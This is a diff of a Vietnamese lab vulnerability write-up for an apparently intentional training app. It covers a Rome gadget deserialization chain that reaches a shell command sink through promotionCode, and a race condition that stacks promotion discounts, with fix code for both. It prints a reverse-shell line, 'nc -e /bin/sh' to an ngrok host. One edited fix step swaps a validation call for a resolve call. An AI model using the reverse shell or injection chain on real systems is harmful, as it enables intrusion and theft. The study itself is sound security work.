@@ -4134,11 +4134,23 @@ public String getQrCode() {
 }
 ```
 
-`@JsonIgnore` chỉ chặn Jackson JSON serialization. Nó không chặn JavaBeans/Rome introspection, nên Rome vẫn có thể gọi `getQrCode()`.
+Payload field được dùng để dựng QR content:
+
+```java
+// File: src/main/java/org/example/payload/BookingRequest.java
+private String buildQrCodeContent() {
+    String promotionPart = promotionCode == null || promotionCode.isBlank()
+            ? "NO_PROMOTION"
+            : promotionCode.trim();
+    return orderPart + "+" + transactionPart + "+" + promotionPart;
+}
+```
+
+Trong đó, `QRCodeHelper().renderQrCode()` là command sink -> có thể chèn shell command qua promotionCode.
 
 ### 3.5. Vì sao payload dùng `HashMap` và double `ObjectBean`
 
-Generator trong repo tạo chain như sau:
+Payload để tạo chain như sau:
 
 ```java
 // File: Payload/ModernRomePayloadGenerator.java
@@ -4156,14 +4168,14 @@ replaceFirstHashMapKey(payload, outerObjectBean);
 
 Lý do từng lớp:
 
-| Thành phần | Vai trò |
-|---|---|
-| `HashMap` | Khi deserialize, `HashMap.readObject()` rebuild bucket và tính hash của key |
-| `outerObjectBean` làm key | Khi HashMap tính hash, gọi `outerObjectBean.hashCode()` |
-| `outerObjectBean.hashCode()` | Vào `EqualsBean.beanHashCode()` rồi gọi `innerObjectBean.toString()` |
-| `innerObjectBean.toString()` | Vào `ToStringBean`, introspect `BookingRequest` |
-| `BookingRequest.getQrCode()` | Getter bị gọi trong quá trình introspection |
-| `QRCodeHelper.renderQrCode(...)` | Tạo side effect qua command sink |
+| Thành phần                       | Vai trò                                                                     |
+| -------------------------------- | --------------------------------------------------------------------------- |
+| `HashMap`                        | Khi deserialize, `HashMap.readObject()` rebuild bucket và tính hash của key |
+| `outerObjectBean` làm key        | Khi HashMap tính hash, gọi `outerObjectBean.hashCode()`                     |
+| `outerObjectBean.hashCode()`     | Vào `EqualsBean.beanHashCode()` rồi gọi `innerObjectBean.toString()`        |
+| `innerObjectBean.toString()`     | Vào `ToStringBean`, introspect `BookingRequest`                             |
+| `BookingRequest.getQrCode()`     | Getter bị gọi trong quá trình introspect                                    |
+| `QRCodeHelper.renderQrCode(...)` | Tạo side effect qua command sink                                            |
 
 Double `ObjectBean` là điểm quan trọng:
 
@@ -4233,21 +4245,12 @@ Trên WebLab này không chọn chuỗi gốc vì project chạy Java 17:
 
 Vấn đề của Rome gốc trên Java 17:
 
-| Điểm phụ thuộc của Rome gốc | Vì sao vướng trên Java 17 |
-|---|---|
-| `com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl` | Đây là JDK internal class trong module `java.xml`, không phải API public ổn định |
-| Ghi private fields như `_bytecodes`, `_name`, `_tfactory` | Strong encapsulation chặn reflective access nếu không có `--add-opens java.xml/...` |
-| Gọi internal Xalan/translet classes | Có thể vướng `IllegalAccessError`/`InaccessibleObjectException` khi module không export/open package |
-| Cần option mở module trên target JVM | Attacker không kiểm soát startup flags của server WebLab |
-
-Điểm dễ nhầm: script generator hiện có dùng `--add-opens java.base/java.util=ALL-UNNAMED`, nhưng flag đó chỉ chạy ở **máy tạo payload** để reflection sửa `HashMap.table`:
-
-```bash
-# File: Payload/gen-modern-rome-payload.sh
-java --add-opens java.base/java.util=ALL-UNNAMED \
-  -cp "$GENERATOR_CLASSES:$PROJECT_CP" \
-  ModernRomePayloadGenerator "$HOST" "$PORT" "$OUTPUT" "$TRANSACTION_ID"
-```
+| Điểm phụ thuộc của Rome gốc                                  | Vì sao vướng trên Java 17                                                                            |
+| ------------------------------------------------------------ | ---------------------------------------------------------------------------------------------------- |
+| `com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl` | Đây là JDK internal class trong module `java.xml`, không phải API public ổn định                     |
+| Ghi private fields như `_bytecodes`, `_name`, `_tfactory`    | Strong encapsulation chặn reflective access nếu không có `--add-opens java.xml/...`                  |
+| Gọi internal Xalan/translet classes                          | Có thể vướng `IllegalAccessError`/`InaccessibleObjectException` khi module không export/open package |
+| Cần option mở module trên target JVM                         | Attacker không kiểm soát startup flags của server WebLab                                             |
 
 Flag này không mở `java.xml` trên JVM server khi server deserialize payload. Vì vậy nó không giải quyết được vấn đề của Rome gốc dựa vào `TemplatesImpl`.
 
@@ -4262,54 +4265,6 @@ WebLab dùng Rome theo hướng application-specific thay vì Rome gốc:
 | Sink cuối | `TemplatesImpl.newTransformer()` | `QRCodeHelper.renderQrCode(...)` |
 
 Kết luận: Rome vẫn dùng được làm **getter trigger**, nhưng không dùng chuỗi Rome gốc vì Java 17 khóa đường `TemplatesImpl`. Chain trong WebLab thay `TemplatesImpl` bằng object business `BookingRequest`, tận dụng getter `getQrCode()` vốn đã gọi QR helper.
-
-### 3.7. Truy ngược từ `getQrCode()` tới hidden command sink
-
-Getter side effect:
-
-```java
-// File: src/main/java/org/example/payload/BookingRequest.java
-@JsonIgnore
-public String getQrCode() {
-    return new QRCodeHelper().renderQrCode(buildQrCodeContent());
-}
-```
-
-Payload field được dùng để dựng QR content:
-
-```java
-// File: src/main/java/org/example/payload/BookingRequest.java
-private String buildQrCodeContent() {
-    String promotionPart = promotionCode == null || promotionCode.isBlank()
-            ? "NO_PROMOTION"
-            : promotionCode.trim();
-    return orderPart + "+" + transactionPart + "+" + promotionPart;
-}
-```
-
-`promotionCode` trong serialized object graph không đi qua controller guard:
-
-```java
-// File: src/main/java/org/example/controller/BookingController.java
-@PostMapping(value = "/draft/import", consumes = MediaType.APPLICATION_OCTET_STREAM_VALUE)
-public ResponseEntity<?> importDraft(@RequestBody byte[] draftBytes, Authentication authentication) {
-    return ResponseEntity.ok().body(bookingService.importDraft(draftBytes, userId));
-}
-```
-
-Trong khi guard này chỉ nằm ở các JSON business endpoint như `/quote`, `/hold`, `/confirm`:
-
-```java
-// File: src/main/java/org/example/controller/BookingController.java
-private void rejectUnsafeBusinessPromotionCode(BookingRequest request) {
-    if (request == null || request.getPromotionCode() == null) {
-        return;
-    }
-    if (!SAFE_BUSINESS_PROMOTION_CODE.matcher(request.getPromotionCode()).matches()) {
-        throw new IllegalArgumentException("Invalid promotion code");
-    }
-}
-```
 
 ***
 
@@ -4341,7 +4296,7 @@ sequenceDiagram
     OIS-->>Service: BookingRequest object
 ```
 
-Luồng này cho thấy vì sao feature tồn tại: app chủ động xuất `.ser` rồi nhập lại. Vấn đề là import endpoint tin mọi `.ser` client upload, không xác thực provenance của draft file và không filter class trước `readObject()`.
+Luồng này cho thấy vì sao feature tồn tại: app chủ động xuất `.ser` rồi nhập lại. Vấn đề là import endpoint tin mọi `.ser` client upload, không xác thực nguồn của draft file và không filter class trước khi `readObject()`.
 
 ### 4.2. Attacker source -> Rome gadget -> getter side effect
 
@@ -4388,36 +4343,26 @@ Key point:
 
 ### 4.3. Detect signals
 
-| Signal | Ý nghĩa |
-|---|---|
+| Signal                                                                    | Ý nghĩa                                                    |
+| ------------------------------------------------------------------------- | ---------------------------------------------------------- |
 | Response trả `status = DRAFT_IMPORTED` và `draftType = java.util.HashMap` | Root object đã deserialize, dù không phải `BookingRequest` |
-| Reverse/OOB callback từ payload | Getter -> QRCodeHelper -> shell side effect đã chạy |
-| Delay khi payload dùng `sleep` | Time-based signal cho hidden sink |
-| File marker được tạo trong container | Side effect command chạy thành công |
-| Server trả lỗi import nhưng side effect vẫn có | Gadget có thể chạy trước khi exception propagate |
+| Reverse/OOB callback từ payload                                           | Getter -> QRCodeHelper -> shell side effect đã chạy        |
+| Delay khi payload dùng `sleep`                                            | Time-based signal cho hidden sink                          |
+| File marker được tạo trong container                                      | Side effect command chạy thành công                        |
+| Server trả lỗi import nhưng side effect vẫn có                            | Gadget có thể chạy trước khi có exception                  |
 
-Ví dụ generator hiện có trong repo:
+Ví dụ chạy payload generator:
 
 ```bash
 # File: Payload/gen-modern-rome-payload.sh
-./Payload/gen-modern-rome-payload.sh <port> [host] [output.ser] [transactionId]
+./Payload/gen-modern-rome-payload.sh <port> 0.tcp.ap.ngrok.io <transactionId> [payload.ser]
 ```
 
 Khi chạy thành công, generator in ra QR content sẽ đi vào command sink:
 
 ```text
-Command content: <transactionId>+; nc -e /bin/sh <host> <port> #
+Command content: <transactionId>+; nc -e /bin/sh 0.tcp.ap.ngrok.io <port> #
 ```
-
-### 4.4. Vì sao Deserialize là lỗ hổng riêng, không chỉ là Command Injection
-
-| Tiêu chí | Deserialize | Command Injection hidden sink |
-|---|---|---|
-| Root cause | Native Java deserialize untrusted bytes | Ghép `qrContent` vào shell command |
-| Sink chính cần detect | `ObjectInputStream.readObject()` | `Runtime.exec(["/bin/sh","-c",command])` |
-| Gadget | Rome `ObjectBean` + `HashMap` | Không cần gadget nếu input vào thẳng helper |
-| Điểm bypass guard | Raw `.ser` không qua JSON/controller guard | Helper nhận `promotionCode` đã nằm trong object graph |
-| Evidence độc lập | `readObject()` rehydrate object graph và trigger getter | Side effect command chỉ là impact cuối |
 
 ***
 
@@ -4488,7 +4433,7 @@ QR phải được tạo ở service sau validation:
 
 ```java
 // File: src/main/java/org/example/serviceImpl/BookingServiceImpl.java
-validateBookingRequest(request);
+resolveBookingTransactions(request);
 String qrContent = request.buildQrCodeContentForService();
 String qrCode = qrCodeService.renderValidatedQrCode(qrContent);
 ```
@@ -4510,7 +4455,7 @@ private void validateImportedDraft(BookingRequest request) {
 }
 ```
 
-### 5.5. Dependency hygiene
+### 5.5. Làm sạch Dependency
 
 Nếu Rome không còn dùng cho tính năng business, gỡ dependency gadget khỏi classpath:
 
@@ -4549,5 +4494,549 @@ Rome được dùng được vì:
 1. `rome:rome:1.0` có trên classpath.
 2. `ObjectBean.hashCode()` và `ObjectBean.toString()` có thể kích hoạt logic introspection.
 3. `HashMap` tự gọi `hashCode()` của key khi deserialize.
-4. `BookingRequest` có getter `getQrCode()` không thuần và getter này gọi QR helper.
+4. `BookingRequest` có getter `getQrCode()` và getter này gọi QR helper.
 5. Type-check sau `readObject()` không thể ngăn side effect đã xảy ra trong quá trình dựng object graph.
+
+
+
+# Race Condition
+
+***
+
+## 1. Kết luận nhanh cho Race Condition Limit Overrun
+
+| Thuộc tính | Giá trị |
+|---|---|
+| Entry tạo order | `POST /api/v1/booking/hold` |
+| Entry race chính | `POST /api/v1/booking/apply-promotion` |
+| Entry hoàn tất booking | `POST /api/v1/booking/confirm` |
+| Quyền truy cập | `ROLE_USER` hoặc `ROLE_ADMIN` |
+| Source chính | JSON `orderId`, `promotionCode` |
+| Sink chính | `BookingOrderRepository.applyPromotionDiscount(...)` native update |
+| State bị overrun | `BOOKING_ORDER.DISCOUNT_AMOUNT`, `BOOKING_ORDER.TOTAL_AMOUNT`, `APPLIED_PROMOTION_CODES` |
+| Limit bị vượt | Một promotion đáng ra chỉ apply một lần trên một held order, nhưng request song song có thể stack nhiều lần |
+| Biến thể phụ | `Promotion.usageLimit` có thể bị overrun nếu nhiều confirm đọc cùng `usedCount` cũ rồi cùng increment |
+| Root cause | Check-then-update không lock `BookingOrder`, không có unique `(order,promotion)`, và update trừ dần từ `TOTAL_AMOUNT` hiện tại |
+
+> **Nhận định:** Race Condition ở WebLab nằm đúng trong flow airline tự nhiên: user giữ chỗ bằng `/booking/hold`, sau đó apply mã giảm giá bằng `/booking/apply-promotion`, rồi confirm bằng `/booking/confirm`. Lỗi chính không phải seat oversell vì transaction hold đã dùng `PESSIMISTIC_WRITE`; lỗi chính là promotion/discount limit overrun trên một `BookingOrder` do nhiều request apply cùng mã chạy song song.
+
+***
+
+## 2. Bản đồ flow tổng quan
+
+```mermaid
+flowchart TD
+    subgraph UserFlow["Normal booking flow"]
+        A1["FlightConfirm.jsx selectedSeats"]
+        A2["POST /api/v1/booking/hold"]
+        A3["BookingServiceImpl.hold()"]
+        A4["bookingOrderRepository.save(order)"]
+        A5["orderId generated"]
+    end
+
+    subgraph RaceWindow["Race window"]
+        B1["N parallel POST /api/v1/booking/apply-promotion"]
+        B2["resolveOwnedOrder(orderId,userId)"]
+        B3["validateActiveOrder(order)"]
+        B4["hasAppliedPromotion(order,promotionCode)"]
+        B5["calculateDiscountAmount(promotion, order.totalAmount)"]
+        B6["applyPromotionDiscount(orderId, discountAmount)"]
+        B7["appendPromotionCode(...) after update"]
+    end
+
+    subgraph Impact["Limit overrun impact"]
+        C1["Same promotion applied multiple times"]
+        C2["DISCOUNT_AMOUNT over-increments"]
+        C3["TOTAL_AMOUNT over-decrements"]
+        C4["pricePerTicket lower than intended"]
+    end
+
+    A1 --> A2 --> A3 --> A4 --> A5 --> B1
+    B1 --> B2 --> B3 --> B4 --> B5 --> B6 --> B7
+    B6 --> C1 --> C2 --> C3 --> C4
+```
+
+***
+
+## 3. Sink -> Source
+
+### 3.1. Fuzz dangerous function để tìm sink candidate
+
+Hướng sink -> source bắt đầu từ các pattern race-prone: read-check-write, counter/limit update, native update cộng/trừ dần, lock annotation, unique constraint, và các state field dùng để chống duplicate.
+
+| Nhóm dangerous function / signal | Pattern fuzz trong code | Candidate tìm thấy | Kết luận |
+|---|---|---|---|
+| Counter / limit update | `usedCount`, `usageLimit`, `>=`, `+ 1`, `save(promotion)` | `validatePromotion(...)`, `confirm(...)`, `confirmOrder(...)` | Có biến thể global usage-limit overrun |
+| Atomic-looking SQL update | `@Modifying`, `update`, `set`, `TOTAL_AMOUNT`, `DISCOUNT_AMOUNT` | `BookingOrderRepository.applyPromotionDiscount(...)` | Sink chính của promotion stacking |
+| Check-then-update | `hasAppliedPromotion`, `appendPromotionCode`, `appliedPromotionCodes` | `BookingServiceImpl.applyPromotion(...)` | Duplicate check không lock |
+| Locking audit | `@Lock`, `PESSIMISTIC_WRITE`, `ForUpdate` | Có ở `TransactionRepository.findByIdAndIsDeletedFalseForUpdate(...)`, thiếu ở `BookingOrderRepository.findById...` | Seat hold an toàn hơn, order promotion chưa an toàn |
+| Unique constraint audit | `@UniqueConstraint`, `(ORDER_ID, PROMOTION_ID)` | `BookingOrderPromotion` chỉ là comment fix, chưa là entity thật | Không có DB constraint chống apply trùng |
+| Source endpoint | `/hold`, `/apply-promotion`, `/confirm`, `orderId`, `promotionCode` | `BookingController.applyPromotion(...)` | Entry race là authenticated business endpoint |
+
+### 3.2. Sink chính: native update trừ dần total
+
+```java
+// File: src/main/java/org/example/repository/BookingOrderRepository.java
+@Modifying(clearAutomatically = true, flushAutomatically = true)
+@Query(value = """
+        update `booking_order`
+        set DISCOUNT_AMOUNT = DISCOUNT_AMOUNT + :discountAmount,
+            TOTAL_AMOUNT = greatest(TOTAL_AMOUNT - :discountAmount, 0)
+        where ID = :id and IS_DELETED = false
+        """, nativeQuery = true)
+public int applyPromotionDiscount(@Param("id") Integer id,
+                                  @Param("discountAmount") BigDecimal discountAmount);
+```
+
+Điểm nguy hiểm:
+
+| Dòng xử lý | Ý nghĩa race |
+|---|---|
+| `DISCOUNT_AMOUNT = DISCOUNT_AMOUNT + :discountAmount` | Mỗi request song song cộng thêm discount |
+| `TOTAL_AMOUNT = greatest(TOTAL_AMOUNT - :discountAmount, 0)` | Mỗi request song song trừ tiếp từ persisted total |
+| `where ID = :id` | Không có điều kiện “promotion chưa applied” |
+| Không có unique row `(order,promotion)` | DB không có điểm fail-fast để reject duplicate |
+
+### 3.3. Check-then-update ở service
+
+```java
+// File: src/main/java/org/example/serviceImpl/BookingServiceImpl.java
+BookingOrder order = resolveOwnedOrder(request.getOrderId(), userId);
+validateActiveOrder(order);
+
+List<Transaction> transactions = resolveOrderTransactions(order);
+Promotion promotion = resolvePromotion(request);
+validatePromotion(promotion, transactions, order.getSubtotal());
+
+String promotionCode = promotion.getCode().trim();
+if (hasAppliedPromotion(order, promotionCode)) {
+    return buildOrderResponse(order, transactions, "PROMOTION_APPLIED");
+}
+
+BigDecimal discountAmount = calculateDiscountAmount(promotion, order.getTotalAmount());
+bookingOrderRepository.applyPromotionDiscount(order.getId(), discountAmount);
+```
+
+Sau update, code mới reload order và append promotion code:
+
+```java
+// File: src/main/java/org/example/serviceImpl/BookingServiceImpl.java
+BookingOrder updatedOrder = bookingOrderRepository.findByIdAndIsDeletedFalse(order.getId());
+updatedOrder.setAppliedPromotionCodes(
+        appendPromotionCode(updatedOrder.getAppliedPromotionCodes(), promotionCode));
+updatedOrder = bookingOrderRepository.save(updatedOrder);
+```
+
+Window race:
+
+```mermaid
+sequenceDiagram
+    actor Attacker
+    participant R1 as Request 1
+    participant R2 as Request 2
+    participant SVC as BookingServiceImpl.applyPromotion
+    participant DB as booking_order
+
+    Attacker->>R1: POST apply-promotion(orderId, PROMO)
+    Attacker->>R2: POST apply-promotion(orderId, PROMO)
+    R1->>SVC: resolveOwnedOrder()
+    R2->>SVC: resolveOwnedOrder()
+    SVC-->>R1: appliedPromotionCodes is empty
+    SVC-->>R2: appliedPromotionCodes is empty
+    R1->>DB: DISCOUNT += X, TOTAL -= X
+    R2->>DB: DISCOUNT += X, TOTAL -= X
+    R1->>DB: append PROMO
+    R2->>DB: append PROMO
+```
+
+### 3.4. Vì sao seat hold không phải sink chính
+
+Khi hold/confirm seat, code resolve transaction bằng lock:
+
+```java
+// File: src/main/java/org/example/serviceImpl/BookingServiceImpl.java
+Transaction transaction = mode.requiresLock()
+        ? transactionRepository.findByIdAndIsDeletedFalseForUpdate(transactionId)
+        : transactionRepository.findByIdAndIsDeletedFalse(transactionId);
+```
+
+Repository có pessimistic lock:
+
+```java
+// File: src/main/java/org/example/repository/TransactionRepository.java
+@Lock(LockModeType.PESSIMISTIC_WRITE)
+@Query("select t from Transaction t where t.id = :id and t.isDeleted = false")
+public Transaction findByIdAndIsDeletedFalseForUpdate(@Param("id") Integer id);
+```
+
+Vì vậy phần seat inventory đã có cơ chế lock tương đối rõ. Race Condition cần ghi nhận ở report này là **promotion limit/discount overrun**, nơi `BookingOrder` không được lock và promotion application không có relation unique.
+
+### 3.5. Truy ngược về source `orderId` và `promotionCode`
+
+`orderId` được tạo ở `/booking/hold`:
+
+```java
+// File: src/main/java/org/example/serviceImpl/BookingServiceImpl.java
+BookingOrder order = BookingOrder.builder()
+        .user(user)
+        .transactionIds(joinTransactionIds(transactions))
+        .status(BookingOrderStatus.HOLD)
+        .subtotal(subtotal)
+        .discountAmount(BigDecimal.ZERO)
+        .totalAmount(subtotal)
+        .holdExpiresAt(holdExpiresAt)
+        .qrCode(request.getQrCode())
+        .build();
+order = bookingOrderRepository.save(order);
+```
+
+Frontend lưu `orderId` để apply promotion:
+
+```javascript
+// File: frontend/src/pages/FlightConfirm.jsx
+const response = await holdBooking(buildBookingPayload(booking, code));
+const quote = response.data;
+if (quote?.orderId) {
+  const updatedBookingData = {
+    ...(currentBookingData || booking),
+    orderId: quote.orderId,
+  };
+  localStorage.setItem('currentBooking', JSON.stringify(updatedBookingData));
+}
+```
+
+Apply promotion gửi source vào race:
+
+```javascript
+// File: frontend/src/pages/FlightConfirm.jsx
+const response = await applyBookingPromotion({
+  orderId: activeOrderId,
+  promotionCode: normalizedCode,
+});
+```
+
+Controller nhận source:
+
+```java
+// File: src/main/java/org/example/controller/BookingController.java
+@PostMapping("/apply-promotion")
+public ResponseEntity<?> applyPromotion(@RequestBody BookingRequest request,
+                                        Authentication authentication) {
+    Integer userId = getAuthenticatedUserId(authentication);
+    return ResponseEntity.ok().body(bookingService.applyPromotion(request, userId));
+}
+```
+
+Trace sink -> source:
+
+```mermaid
+flowchart RL
+    S1["applyPromotionDiscount(orderId, discountAmount)"]
+    S2["discountAmount = calculateDiscountAmount(promotion, order.totalAmount)"]
+    S3["hasAppliedPromotion(order,promotionCode) check"]
+    S4["resolveOwnedOrder(orderId,userId)"]
+    S5["BookingController.applyPromotion(@RequestBody BookingRequest)"]
+    S6["POST /api/v1/booking/apply-promotion"]
+    S7["FlightConfirm.jsx applyBookingPromotion({orderId,promotionCode})"]
+    S8["orderId generated by /booking/hold"]
+
+    S1 --> S2 --> S3 --> S4 --> S5 --> S6 --> S7 --> S8
+```
+
+***
+
+## 4. Source -> Sink
+
+### 4.1. Normal source -> sink
+
+```mermaid
+sequenceDiagram
+    actor User
+    participant FE as FlightConfirm.jsx
+    participant Hold as POST /booking/hold
+    participant Apply as POST /booking/apply-promotion
+    participant Service as BookingServiceImpl
+    participant Repo as BookingOrderRepository
+    participant DB as booking_order
+
+    User->>FE: Select seats
+    FE->>Hold: transactionIds
+    Hold->>Service: hold(request,userId)
+    Service->>DB: save BookingOrder(status=HOLD,total=subtotal)
+    DB-->>FE: orderId
+    User->>FE: Enter promotionCode
+    FE->>Apply: orderId + promotionCode
+    Apply->>Service: applyPromotion(request,userId)
+    Service->>Service: hasAppliedPromotion(...)
+    Service->>Repo: applyPromotionDiscount(orderId, discount)
+    Repo->>DB: DISCOUNT += discount, TOTAL -= discount
+```
+
+### 4.2. Race source -> limit overrun
+
+Attack shape:
+
+1. Gọi `/booking/hold` để lấy `orderId`.
+2. Gửi N request song song tới `/booking/apply-promotion` với cùng `orderId` và `promotionCode`.
+3. Các request cùng đọc `APPLIED_PROMOTION_CODES` trước khi request khác append xong.
+4. Mỗi request đều chạy `applyPromotionDiscount(...)`.
+5. `DISCOUNT_AMOUNT` / `TOTAL_AMOUNT` phản ánh nhiều lần discount cho cùng một mã.
+
+Mermaid race:
+
+```mermaid
+flowchart TD
+    A["orderId = HOLD order"]
+    B["promotionCode = SAME_CODE"]
+    C1["Request 1 reads no applied code"]
+    C2["Request 2 reads no applied code"]
+    C3["Request N reads no applied code"]
+    D1["UPDATE discount += X, total -= X"]
+    D2["UPDATE discount += X, total -= X"]
+    D3["UPDATE discount += X, total -= X"]
+    E["Total discount = N * X"]
+    F["Limit overrun: same promotion applied multiple times"]
+
+    A --> C1 --> D1 --> E
+    B --> C1
+    A --> C2 --> D2 --> E
+    B --> C2
+    A --> C3 --> D3 --> E
+    B --> C3
+    E --> F
+```
+
+### 4.3. Biến thể global `usageLimit` overrun
+
+`validatePromotion(...)` có check usage limit:
+
+```java
+// File: src/main/java/org/example/serviceImpl/BookingServiceImpl.java
+if (promotion.getUsageLimit() != null
+        && promotion.getUsedCount() != null
+        && promotion.getUsedCount() >= promotion.getUsageLimit()) {
+    throw new IllegalArgumentException("Promotion usage limit reached");
+}
+```
+
+Nhưng increment `usedCount` nằm ở confirm, không lock `Promotion`:
+
+```java
+// File: src/main/java/org/example/serviceImpl/BookingServiceImpl.java
+for (String promotionCode : parsePromotionCodes(order.getAppliedPromotionCodes())) {
+    Promotion promotion = promotionRepository.findByCodeAndIsDeletedFalse(promotionCode);
+    if (promotion != null) {
+        promotion.setUsedCount((promotion.getUsedCount() == null ? 0 : promotion.getUsedCount()) + 1);
+        promotionRepository.save(promotion);
+    }
+}
+```
+
+Nếu nhiều order khác nhau cùng dùng mã còn 1 slot:
+
+```mermaid
+sequenceDiagram
+    participant O1 as Order 1 confirm
+    participant O2 as Order 2 confirm
+    participant Promo as PROMOTION row
+
+    O1->>Promo: read usedCount=9, usageLimit=10
+    O2->>Promo: read usedCount=9, usageLimit=10
+    O1->>Promo: save usedCount=10
+    O2->>Promo: save usedCount=10 or overwrite
+```
+
+Kết quả business: nhiều booking cùng pass limit khi chỉ còn một slot promotion. Tùy isolation/write timing, DB có thể lost update hoặc count sai, nhưng quan trọng là **limit check không reserve slot atomically**.
+
+***
+
+## 5. Khai thác / Detect
+
+### 5.1. Điều kiện khai thác
+
+| Điều kiện | Ghi chú |
+|---|---|
+| Có JWT user hợp lệ | Endpoint là authenticated |
+| Có `orderId` HOLD | Tạo bằng `/api/v1/booking/hold` |
+| Promotion hợp lệ | Active, đúng route/seat/date/minimum |
+| Gửi request song song | Cần concurrency để cùng vượt qua `hasAppliedPromotion(...)` |
+| Confirm trước khi hold hết hạn | `validateActiveOrder(...)` yêu cầu status `HOLD` và `holdExpiresAt` còn hiệu lực |
+
+### 5.2. Race request shape
+
+```http
+POST /api/v1/booking/apply-promotion HTTP/1.1
+Authorization: Bearer <user-jwt>
+Content-Type: application/json
+
+{
+  "orderId": 123,
+  "promotionCode": "SUMMER10"
+}
+```
+
+Expected evidence:
+
+| Evidence | Ý nghĩa |
+|---|---|
+| N response đều `PROMOTION_APPLIED` hoặc trả total đã giảm | N request vượt qua check |
+| `DISCOUNT_AMOUNT` lớn hơn discount một lần | Same promotion bị stack |
+| `TOTAL_AMOUNT` thấp hơn expected | Limit overrun thành công |
+| `APPLIED_PROMOTION_CODES` có duplicate hoặc không phản ánh đủ số lần trừ tiền | String snapshot không phải source of truth |
+| Confirm order ra `pricePerTicket` thấp bất thường | Impact user-visible |
+
+***
+
+## 6. Fix guidance đặt cạnh sink
+
+### 6.1. Lock `BookingOrder` khi apply promotion
+
+```java
+// File: src/main/java/org/example/repository/BookingOrderRepository.java
+@Lock(LockModeType.PESSIMISTIC_WRITE)
+@Query("select o from BookingOrder o where o.id = :id and o.isDeleted = false")
+BookingOrder findByIdAndIsDeletedFalseForUpdate(@Param("id") Integer id);
+```
+
+Service phải dùng lock ngay từ đầu transaction:
+
+```java
+// File: src/main/java/org/example/serviceImpl/BookingServiceImpl.java
+BookingOrder order = bookingOrderRepository.findByIdAndIsDeletedFalseForUpdate(request.getOrderId());
+if (order == null) {
+    throw new IllegalArgumentException("Booking order not found: " + request.getOrderId());
+}
+if (order.getUser() == null || !order.getUser().getId().equals(userId)) {
+    throw new IllegalStateException("Booking order does not belong to current user");
+}
+validateActiveOrder(order);
+```
+
+### 6.2. Thêm relation unique `(order,promotion)`
+
+Không dùng string `APPLIED_PROMOTION_CODES` làm source chống duplicate. Dùng bảng quan hệ có unique constraint:
+
+```java
+// File: src/main/java/org/example/entity/BookingOrderPromotion.java
+@Table(
+    name = "BOOKING_ORDER_PROMOTION",
+    uniqueConstraints = @UniqueConstraint(
+        name = "UK_ORDER_PROMOTION",
+        columnNames = {"ORDER_ID", "PROMOTION_ID"}
+    )
+)
+@Entity
+public class BookingOrderPromotion extends BaseObject {
+    @ManyToOne
+    @JoinColumn(name = "ORDER_ID", nullable = false)
+    private BookingOrder order;
+
+    @ManyToOne
+    @JoinColumn(name = "PROMOTION_ID", nullable = false)
+    private Promotion promotion;
+}
+```
+
+Repository:
+
+```java
+// File: src/main/java/org/example/repository/BookingOrderPromotionRepository.java
+public interface BookingOrderPromotionRepository
+        extends JpaRepository<BookingOrderPromotion, Integer> {
+    boolean existsByOrderIdAndPromotionId(Integer orderId, Integer promotionId);
+    List<BookingOrderPromotion> findByOrderIdAndIsDeletedFalse(Integer orderId);
+}
+```
+
+### 6.3. Recalculate từ `SUBTOTAL`, không trừ dần từ `TOTAL_AMOUNT`
+
+```java
+// File: src/main/java/org/example/serviceImpl/BookingServiceImpl.java
+if (bookingOrderPromotionRepository.existsByOrderIdAndPromotionId(order.getId(), promotion.getId())) {
+    return buildOrderResponse(order, transactions, "PROMOTION_APPLIED");
+}
+
+BookingOrderPromotion appliedPromotion = new BookingOrderPromotion();
+appliedPromotion.setOrder(order);
+appliedPromotion.setPromotion(promotion);
+bookingOrderPromotionRepository.saveAndFlush(appliedPromotion);
+
+List<Promotion> appliedPromotions = bookingOrderPromotionRepository
+        .findByOrderIdAndIsDeletedFalse(order.getId())
+        .stream()
+        .map(BookingOrderPromotion::getPromotion)
+        .toList();
+
+BigDecimal totalDiscount = appliedPromotions.stream()
+        .map(applied -> calculateDiscountAmount(applied, order.getSubtotal()))
+        .reduce(BigDecimal.ZERO, BigDecimal::add)
+        .min(order.getSubtotal());
+
+order.setDiscountAmount(totalDiscount);
+order.setTotalAmount(order.getSubtotal().subtract(totalDiscount).max(BigDecimal.ZERO));
+order.setAppliedPromotionCodes(appliedPromotions.stream()
+        .map(Promotion::getCode)
+        .collect(Collectors.joining(",")));
+```
+
+### 6.4. Fix global `usageLimit` bằng lock hoặc atomic reserve
+
+Lock promotion row khi reserve/increment usage:
+
+```java
+// File: src/main/java/org/example/repository/PromotionRepository.java
+@Lock(LockModeType.PESSIMISTIC_WRITE)
+@Query("select p from Promotion p where p.code = :code and p.isDeleted = false")
+Promotion findByCodeAndIsDeletedFalseForUpdate(@Param("code") String code);
+```
+
+Hoặc dùng atomic update có điều kiện:
+
+```java
+// File: src/main/java/org/example/repository/PromotionRepository.java
+@Modifying(clearAutomatically = true, flushAutomatically = true)
+@Query("""
+        update Promotion p
+        set p.usedCount = coalesce(p.usedCount, 0) + 1
+        where p.id = :id
+          and p.isDeleted = false
+          and (p.usageLimit is null or coalesce(p.usedCount, 0) < p.usageLimit)
+        """)
+int reserveUsageSlot(@Param("id") Integer id);
+```
+
+Service phải fail nếu không reserve được slot:
+
+```java
+// File: src/main/java/org/example/serviceImpl/BookingServiceImpl.java
+int reserved = promotionRepository.reserveUsageSlot(promotion.getId());
+if (reserved != 1) {
+    throw new IllegalStateException("Promotion usage limit reached");
+}
+```
+
+***
+
+## 7. Tổng kết Race Condition
+
+Race Condition Limit Overrun trong WebLab có sink chính:
+
+```mermaid
+flowchart TD
+    A["POST /booking/hold"]
+    B["BookingOrder HOLD được tạo và sinh orderId"]
+    C["N request song song POST /booking/apply-promotion"]
+    D["hasAppliedPromotion(...) đều thấy mã chưa apply"]
+    E["applyPromotionDiscount(...) chạy nhiều lần"]
+    F["DISCOUNT_AMOUNT/TOTAL_AMOUNT vượt giới hạn nghiệp vụ"]
+
+    A --> B --> C --> D --> E --> F
+```
+
+Điểm cần ghi nhớ:
+
+1. Seat inventory không phải sink chính vì `TransactionRepository` đã có `PESSIMISTIC_WRITE`.
+2. Promotion stacking xảy ra vì `BookingOrder` không bị lock trong `applyPromotion`.
+3. `APPLIED_PROMOTION_CODES` là string snapshot, không phải constraint.
+4. Native update trừ từ `TOTAL_AMOUNT` khiến mỗi request song song đều có tác động thật.
+5. Fix đúng là lock order, unique `(order,promotion)`, và tính lại total từ `SUBTOTAL` thay vì decrement dần.
